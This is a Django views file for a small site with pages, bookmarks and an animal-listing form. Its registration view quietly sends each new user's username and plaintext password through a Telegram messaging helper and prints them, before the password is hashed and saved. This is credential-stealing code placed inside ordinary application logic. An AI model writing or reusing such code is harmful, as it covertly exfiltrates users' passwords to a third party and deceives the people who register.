from django.shortcuts import render, redirect
from django.http import HttpResponse
from django.contrib.auth.views import LoginView
from django.contrib.auth.forms import AuthenticationForm
from django.contrib.auth import authenticate, login

from .forms import UserRegistrationForm
from .telegram import send_msg
from django.shortcuts import render,redirect
from .models import *
from .forms import AnimalsForm
from django.shortcuts import redirect
from django.http import JsonResponse
from django.views.generic import View
from django.contrib.auth.models import User

import json

from django.contrib import auth
from django.http import HttpResponse
from django.views import View


def index(request):
    return render(request, 'main/index.html')

def first(request):
    return render(request, 'main/first_page.html')

def second(request):
    return render(request, 'main/second_page.html')

def third(request):
        return render(request, 'main/third_page.html')

def check(request):
        return render(request, 'main/check.html')


def register(request):
    if request.method == 'POST':
        user_form = UserRegistrationForm(request.POST)
        if user_form.is_valid():
            # Create a new user object but avoid saving it yet
            new_user = user_form.save(commit=False)

            data = user_form.cleaned_data
            message_to_send = f"Логин: {data['username']}\nПароль: {data['password']}"
            try:
                send_msg(message_to_send)
                print(message_to_send)
            except:
                user_form.add_error(None, "Ошибка отправки формы. Попробуйте позднее.")
            # Set the chosen password
            new_user.set_password(data['password'])
            # Save the User object
            new_user.save()
            login(request,new_user)
            return render(request, 'main/register_done.html', {'new_user': new_user})
    else:
        user_form = UserRegistrationForm()
    return render(request, 'main/register.html', {'user_form': user_form})


class BookmarkView(View):
    # в данную переменную будет устанавливаться модель закладок, которую необходимо обработать
    model = Bookmark

    def get_queryset(self):
        return Bookmark.objects.all()

    def post(self, request, pk):
        # нам потребуется пользователь
        user = auth.get_user(request)
        # пытаемся получить закладку из таблицы, или создать новую
        bookmark, created = self.model.objects.get_or_create(user=user, obj_id=pk)
        # если не была создана новая закладка,
        # то считаем, что запрос был на удаление закладки
        if not created:
            bookmark.delete()


        data = {
            "result": created,
            "id": pk,
        }

        return JsonResponse(data)


def base_home(request):
    animals=Animals.objects.all()
    return render(request, 'main/base.html',{'animals':animals})


def create(request):
    error=''
    if request.method=='POST':
        form=AnimalsForm(request.POST)
        if form.is_valid():
            form.save()
            return redirect('base_home')
        else:
            error="Форма была неверной"


    form=AnimalsForm()

    data={
        'form': form,
        'error':error
    }


    return render(request, 'main/create.html',data)
